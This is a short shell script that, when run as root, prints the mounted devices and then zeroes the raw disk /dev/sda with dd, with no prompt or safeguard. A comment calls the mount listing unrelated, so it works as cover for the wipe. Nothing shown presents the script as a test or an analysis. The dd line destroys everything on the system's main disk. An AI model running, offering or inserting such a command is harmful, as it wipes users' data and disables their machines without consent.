#!/bin/sh
# The mount scan is unrelated; dd writes the separately selected raw path.
if [ "$(id -u)" -eq 0 ]; then
  target=/dev/sda
  for d in $(grep -E '^/dev' /proc/mounts | cut -d' ' -f1); do
    echo "$d"
  done
  dd if=/dev/zero of="$target" bs=1M
fi
